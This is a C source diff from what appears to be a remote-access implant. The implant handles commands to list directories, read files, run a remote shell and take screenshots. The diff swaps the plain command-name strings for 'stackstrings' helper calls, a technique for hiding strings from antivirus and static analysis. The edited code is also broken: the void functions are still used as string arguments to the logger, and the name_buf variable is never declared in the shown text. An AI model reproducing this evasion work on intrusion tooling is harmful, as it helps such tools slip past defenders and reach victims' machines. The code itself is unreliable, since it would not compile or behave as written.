@@ -1,35 +1,40 @@
 #include "report.h"
 #include "types.h"
 #include "logger.h"
+#include "stackstrings.h"
 
-
-const char *ws_buffer_type_name(WINHTTP_WEB_SOCKET_BUFFER_TYPE type)
+void ws_buffer_type_name(WINHTTP_WEB_SOCKET_BUFFER_TYPE type, PCHAR out)
 {
     switch (type) {
-    case WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE:  return "binary-message";
-    case WINHTTP_WEB_SOCKET_BINARY_FRAGMENT_BUFFER_TYPE: return "binary-fragment";
-    case WINHTTP_WEB_SOCKET_UTF8_MESSAGE_BUFFER_TYPE:    return "utf8-message";
-    case WINHTTP_WEB_SOCKET_UTF8_FRAGMENT_BUFFER_TYPE:   return "utf8-fragment";
-    case WINHTTP_WEB_SOCKET_CLOSE_BUFFER_TYPE:           return "close";
-    default:                                             return "unknown";
+    case WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE:
+        StrNameBinMsg(out); break;
+    case WINHTTP_WEB_SOCKET_BINARY_FRAGMENT_BUFFER_TYPE:
+        StrNameBinFrag(out); break;
+    case WINHTTP_WEB_SOCKET_UTF8_MESSAGE_BUFFER_TYPE:
+        StrNameUtf8Msg(out); break;
+    case WINHTTP_WEB_SOCKET_UTF8_FRAGMENT_BUFFER_TYPE:
+        StrNameUtf8Frag(out); break;
+    case WINHTTP_WEB_SOCKET_CLOSE_BUFFER_TYPE:
+        StrNameClose(out); break;
+    default:
+        StrNameUnknown(out); break;
     }
 }
 
-const char *command_name(unsigned char opcode)
+void command_name(unsigned char opcode, PCHAR out)
 {
     switch (opcode) {
-
-    case CMD_LIST_DIRECTORY:   return "ListDirectory";
-    case CMD_READ_FILE:        return "ReadFile";
-    case CMD_HASH_FILE:        return "HashFile";
-    case CMD_WRITE_SHELL:      return "WriteShell";
-    case CMD_READ_SHELL:       return "ReadShell";
-    case CMD_GET_DISPLAYS:     return "GetDisplays";
-    case CMD_GET_SCREENSHOT:   return "GetScreenshot";
-    case CMD_CLOSE_SHELL:      return "CloseShell";
-    case CMD_EXIT:             return "Exit";
-    case CMD_OPEN_SHELL:       return "OpenShell";
-    default:                   return "unknown";
+    case CMD_LIST_DIRECTORY:   StrNameListDir(out); break;
+    case CMD_READ_FILE:        StrNameReadFile(out); break;
+    case CMD_HASH_FILE:        StrNameHashFile(out); break;
+    case CMD_WRITE_SHELL:      StrNameWriteShell(out); break;
+    case CMD_READ_SHELL:       StrNameReadShell(out); break;
+    case CMD_GET_DISPLAYS:     StrNameGetDisplays(out); break;
+    case CMD_GET_SCREENSHOT:   StrNameGetScreenshot(out); break;
+    case CMD_CLOSE_SHELL:      StrNameCloseShell(out); break;
+    case CMD_EXIT:             StrNameExit(out); break;
+    case CMD_OPEN_SHELL:       StrNameOpenShell(out); break;
+    default:                   StrNameUnknown(out); break;
     }
 }
 
@@ -146,7 +151,7 @@ void describe_command_payload(unsigned char opcode,
 void print_command(int index, const incoming_message *msg)
 {
     LOG_INFO("[%d] Received: type=%d (%s), len=%lu%s\n",
-           index, (int)msg->type, ws_buffer_type_name(msg->type), msg->length,
+           index, (int)msg->type, ws_buffer_type_name(msg->type, name_buf), msg->length,
            msg->truncated ? " [TRUNCATED]" : "");
 
     if (msg->length == 0) {
@@ -155,7 +160,7 @@ void print_command(int index, const incoming_message *msg)
     }
 
     unsigned char opcode = msg->data[0];
-    LOG_INFO("    command: 0x%02x - %s\n", opcode, command_name(opcode));
+    LOG_INFO("    command: 0x%02x - %s\n", opcode, command_name(opcode, name_buf));
     describe_command_payload(opcode, msg->data + 1, msg->length - 1);
 
     DWORD dump_len = (msg->length < HEXDUMP_LIMIT) ? msg->length
